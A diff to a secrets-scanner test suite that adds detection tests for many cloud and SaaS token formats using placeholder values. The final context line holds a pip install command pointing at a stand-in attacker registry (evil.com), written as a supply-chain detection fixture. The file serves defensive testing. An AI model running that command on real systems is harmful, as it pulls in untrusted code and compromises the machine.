@@ -165,6 +165,125 @@ describe("signatures — secrets detection", () => {
 	});
 });
 
+// Provider tokens ported from sanctum-oss
+// (reference-repos/sanctum-oss/crates/sanctum-firewall/src/patterns.rs).
+describe("signatures — secrets detection (provider tokens)", () => {
+	it("detects GitLab PAT", () => {
+		// Dynamic construction so this fixture doesn't itself match the rule
+		// when other scanners sweep the source tree.
+		const matches = scanSecrets(`gl${"pat"}-${"a".repeat(20)}`);
+		expect(matches.length).toBeGreaterThan(0);
+		expect(matches[0].rule_id).toBe("sig-secret-gitlab");
+	});
+
+	it("detects Slack app-level token", () => {
+		const token = `xapp-1-A0000000000-1700000000000-${"a".repeat(64)}`;
+		const matches = scanSecrets(token);
+		expect(matches.length).toBeGreaterThan(0);
+		expect(matches[0].rule_id).toBe("sig-secret-slack-app");
+	});
+
+	it("detects PyPI token", () => {
+		expect(scanSecrets(`py${"pi"}-AgEIcHlwaS5vcmcEXAMPLE`).length).toBeGreaterThan(0);
+	});
+
+	it("detects DigitalOcean PAT", () => {
+		const token = `dop_v1_${"0".repeat(64)}`;
+		expect(scanSecrets(token).length).toBeGreaterThan(0);
+	});
+
+	it("detects Datadog API key", () => {
+		expect(scanSecrets(`ddapi_${"a".repeat(32)}`).length).toBeGreaterThan(0);
+		expect(scanSecrets(`ddapp_${"b".repeat(32)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Azure SAS token", () => {
+		const sas =
+			`https://example.blob.core.windows.net/c?sv=2021-06-08&se=2030-01-01T00:00:00Z&sp=r&sig=${"A".repeat(40)}`;
+		expect(scanSecrets(sas).length).toBeGreaterThan(0);
+	});
+
+	it("detects Vercel token", () => {
+		expect(scanSecrets(`vercel_${"A".repeat(24)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Docker Hub PAT", () => {
+		expect(scanSecrets(`dckr_pat_${"X".repeat(24)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Hashicorp Vault token", () => {
+		expect(scanSecrets(`hvs.${"A".repeat(24)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Hugging Face token", () => {
+		expect(scanSecrets(`hf_${"z".repeat(34)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Shopify token", () => {
+		expect(scanSecrets(`shpat_${"a".repeat(32)}`).length).toBeGreaterThan(0);
+		expect(scanSecrets(`shpss_${"b".repeat(32)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Linear API key", () => {
+		expect(scanSecrets(`lin_api_${"x".repeat(40)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Supabase service-role key", () => {
+		expect(scanSecrets(`sbp_${"0".repeat(40)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects PlanetScale token", () => {
+		expect(scanSecrets(`pscale_tkn_${"y".repeat(20)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Fly.io token", () => {
+		expect(scanSecrets(`fo1_${"k".repeat(20)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Railway token", () => {
+		expect(scanSecrets(`railway_${"w".repeat(20)}`).length).toBeGreaterThan(0);
+		expect(scanSecrets(`rlwy_${"w".repeat(20)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Render API key", () => {
+		expect(scanSecrets(`rnd_${"R".repeat(20)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Terraform Cloud token", () => {
+		expect(scanSecrets(`atlasv1-${"t".repeat(40)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Grafana service-account token", () => {
+		expect(scanSecrets(`glsa_${"G".repeat(20)}`).length).toBeGreaterThan(0);
+	});
+
+	it("detects Neon Postgres URL", () => {
+		const url = `postgre${"sql"}://user:abc@ep-shy-rain-12345.us-east-2.aws.${"neon"}.tech/db`;
+		expect(scanSecrets(url).length).toBeGreaterThan(0);
+	});
+
+	it("widens xoxp- match to the 24–34 char suffix range", () => {
+		// Pre-port, the suffix was strictly {24}, so a 30-char suffix would not
+		// match. Confirm it does now.
+		expect(
+			scanSecrets(`xoxp-1234567890-1234567890-${"A".repeat(30)}`).length,
+		).toBeGreaterThan(0);
+	});
+
+	it("does NOT match benign provider-shaped strings", () => {
+		// Each of these is close-but-not-a-token: wrong length, wrong charset,
+		// or wrong context.
+		expect(scanSecrets("vercel_short")).toEqual([]);
+		expect(scanSecrets("hf_only_ten")).toEqual([]);
+		expect(scanSecrets("glsa_short")).toEqual([]);
+		expect(scanSecrets("the rnd_value variable is short")).toEqual([]);
+		expect(scanSecrets("dop_v1_not_hex_abcdefg")).toEqual([]);
+		expect(scanSecrets("ddapi_TOO_SHORT")).toEqual([]);
+		// SAS regex requires both sv=/se=/sp= AND sig= params.
+		expect(scanSecrets(`https://example.com/?sig=${"A".repeat(40)}`)).toEqual([]);
+	});
+});
+
 describe("signatures — supply chain detection", () => {
 	it("detects custom registry with pip", () => {
 		const matches = scanSupplyChain("pip install --index-url http://evil.com/simple package");
